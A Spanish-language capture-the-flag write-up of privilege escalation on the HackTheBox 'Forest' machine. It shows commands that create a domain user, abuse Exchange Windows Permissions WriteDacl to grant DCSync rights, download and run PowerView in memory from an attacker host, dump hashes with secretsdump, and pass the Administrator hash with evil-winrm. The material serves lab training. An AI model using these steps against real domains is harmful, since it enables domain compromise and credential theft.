## Privilege Escalation {-}

### Rootear la maquina {-}

El usuario svc-alfresco es miembro del groupo service accounts que es miembro de grupo privileged accounts que es miembro 
del grupo account operators.

Este grupo account operators tiene permissions de typo Generic all sobre el grupo Exchange windows permissions. Si buscamos
por internet lo que es el account operators vemos que es un grupo de verdad que permitte crear usuarios y privilegios. Lo comprobamos
en el evil-winRM

```bash
net user s4vitar s4vit4r123$! /add /domain
net user s4vitar
```

Effectivamente podemos crear usuarios.

Si seguimos analysando el BloodHound vemos que el grupo exchange Windows permission tiene capacidad de typo WriteDacl sobre el dominio.
Si hacemos un click derecho sobre el **WriteDacl** podemos mirar mas informaciones

```{r, echo = FALSE, fig.cap="Bloodhound abuse WriteDacl", out.width="90%"}
    knitr::include_graphics("images/Forest-Abuse_writedacl.png")
```

1. Añadimos el grupo Exchange Windows Permissions al usuario creado

    ```bash
    net group
    net group "Exchange Windows Permissions" s4vitar /add
    net user s4vitar
    ```

1. Passamos a la maquina victima el powerView

    - en la maquina de atacante

        ```bash
        wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1
        python3 -m http.server 80
        ```

    - en la maquina victima

        ```bash
        IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/powerview.ps1')
        ```

1. Asignamos el privilegio ds sync al usuario s4vitar

    ```bash
    $SecPassword = ConvertTo-SecureString 's4vit4r123$!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('htb.local\s4vitar', $SecPassword)
    Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity s4vitar -Rights DCSync
    ```

1. Desde la maquina de atacante podemos lanzar un impacket-secretsdump para recuperar los hashes de los usuarios

    ```bash
    impacket-secretsdump htb.local/s4vitar@10.10.10.161
    ```

Ya tenemos el hash del usuario administrador

```{r, echo = FALSE, fig.cap="DCSync Admin hash", out.width="90%"}
    knitr::include_graphics("images/Forest-dcsync-admin-hash.png")
```

lo copiamos y con evilwin-rm nos connectamos como el usuario administrator haciendo un passthehash.

```bash
evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d3372a07ceea6'
```

`WHOAMI -> htb\administrator` ;)
